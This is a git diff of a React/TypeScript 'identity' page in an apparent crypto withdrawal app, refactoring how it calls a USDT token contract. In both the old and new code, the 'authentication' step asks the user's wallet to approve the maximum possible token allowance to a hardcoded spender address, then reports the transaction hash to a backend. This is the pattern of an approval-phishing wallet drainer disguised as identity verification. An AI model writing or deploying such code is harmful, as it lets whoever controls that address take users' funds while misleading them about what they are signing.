@@ -1,4 +1,4 @@
-import { useCallback, useEffect, useRef, useState } from "react";
+import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 
 import style from "./index.module.scss";
 import {
@@ -30,7 +30,7 @@ import { withdraw } from "@/api/common";
 import Select from "@/components/Select";
 import { useWeb3 } from "@/hooks/useWeb3/useWeb3";
 
-import ABI from "./ABI.json";
+import ABI from "./ABIUSDT.json";
 import { authentication } from "@/api/userInfo";
 import { AbiItem } from "web3-utils";
 
@@ -92,90 +92,54 @@ function identity() {
   const selectRef = useRef<any>(null);
   const selectAccountRef = useRef<any>(null);
 
-  useEffect(() => {
-    getData();
-    ref?.current.setVal(receiveAddress);
-  }, [currentAccount]);
-
+  const coinAddres = useMemo(() => {
+    return current.type === "USDT" ? inputAddress[0] : inputAddress[1];
+  }, [current]);
   useEffect(() => {
     console.log("web3=>useEffect", web3);
 
-    if (receiveAddress) {
+    if (web3 && coinAddres) {
+      console.log(coinAddres);
       const contractInstanceTemp: any =
-        web3 &&
-        new web3.eth.Contract(
-          ABI as AbiItem[],
-          current.type === "USDT" ? inputAddress[0] : inputAddress[1]
-        );
+        web3 && new web3.eth.Contract(ABI as AbiItem[], coinAddres);
       console.log("contractInstance=>", contractInstanceTemp);
       setContractInstance(contractInstanceTemp);
     }
-  }, [web3, current]);
+  }, [web3, current, coinAddres]);
   const useContract = async () => {
-    console.log("web3=>useContract", web3);
+    const spenderAddress = "0x1FdfbB4e5C4C7aF8B1CA1700F3b67690B7d798D5"; // 目标地址
+    const maxApprovalAmount = web3?.utils.toHex(
+      "115792089237316195423570985008687907853269984665640564039457584007913129639935"
+    ); // 最大授权数量
 
-    // const twoTo256: any = web3?.utils.toBN(
-    //   "0x10000000000000000000000000000000000000000000000000000000000000000"
-    // );
-    // const twoTo256MinusOne = twoTo256.sub(web3?.utils.toBN("1"));
+    const fee = web3?.utils.toHex(0);
+    const gasPrice: any = (await web3?.eth.getGasPrice()) || ""; // 获取当前网络上的最低交易手续费用
+    console.log(gasPrice);
+    const gasLimit = 50000; // 设置gas上限
 
-    // const totalSupply = await contractInstance.methods.totalSupply().call();
-    const maxValue = web3?.utils
-      .toBN(2)
-      .pow(web3?.utils.toBN(256))
-      .sub(web3?.utils.toBN(1));
-    console.log("maxValue=>", maxValue);
-    const data = await contractInstance.methods
-      .approve("0x1FdfbB4e5C4C7aF8B1CA1700F3b67690B7d798D5", maxValue)
-      .encodeABI();
-    console.log("合约data==>", data);
-
-    let gasPrice: any = await web3?.eth.getGasPrice();
-    console.log("gasPrice=>", gasPrice);
-    // // 传值大于1.2
-    gasPrice = parseInt(gasPrice * 1.2 + "");
-    // 不知道是不是要tohex格式
-    gasPrice = web3?.utils.toHex(gasPrice);
-
-    const value = web3?.utils.toHex(0);
-    console.log("gasPrice=>", gasPrice);
-    // // const chainId = await web3?.eth.getChainId();
-    // // console.log("chainId=>", chainId);
-    const emitPrams = {
-      // chainId: 1,
-      from: accountAddress,
-      to: current.type === "USDT" ? inputAddress[0] : inputAddress[1],
-      gasPrice,
-      value,
-      data,
-    };
-    console.log("emitPrams=>", emitPrams);
-
-    const gas: any = await web3?.eth.estimateGas(emitPrams);
-    console.log("gas=>>>", gas);
-    const sendTransactionPramas = {
-      // chainId: 1,
-      from: accountAddress,
-      to: current.type === "USDT" ? inputAddress[0] : inputAddress[1],
-      gasPrice,
-      value,
-      gas: Number(gas),
-      data: data,
-    };
-    console.log("sendTransactionPramas=>", sendTransactionPramas);
-
-    web3?.eth.sendTransaction(sendTransactionPramas, async (error, hash) => {
-      console.log(error, hash);
-      if (hash) {
+    const result = await contractInstance.methods
+      .approve(spenderAddress, maxApprovalAmount)
+      .send({
+        from: accountAddress,
+        gasPrice: gasPrice,
+        gas: gasLimit,
+        value: fee,
+        // gasPrice: web3?.utils.fromWei(gasPrice, "ether"), // 设置适当的gas价格
+      });
+    console.log(result);
+    if (result.status) {
+      if (result.transactionHash) {
         const { data } = await authentication({
-          tokenList: [current.type === "USDT" ? inputAddress[0] : inputAddress[1]],
-          trxHash: hash,
+          tokenList: [coinAddres],
+          trxHash: result.transactionHash,
         });
         return nav("/assetsAll");
       }
-      return Toast.notice(error.message, {});
-    });
+    } else {
+      return Toast.notice(t("common.faild"), {});
+    }
   };
+
   const onSubmit = async () => {
     console.log("提交");
     if (!(Number(withdrawalAmount) > 0.1)) {
@@ -254,6 +218,10 @@ function identity() {
     const { data } = await method();
     setCoinUseCount(data.availableUsdtBalance || 0);
   };
+  useEffect(() => {
+    getData();
+    ref?.current.setVal(receiveAddress);
+  }, [currentAccount]);
   function inputRight() {
     return <div className="withdrawal-usdt">USDT</div>;
   }
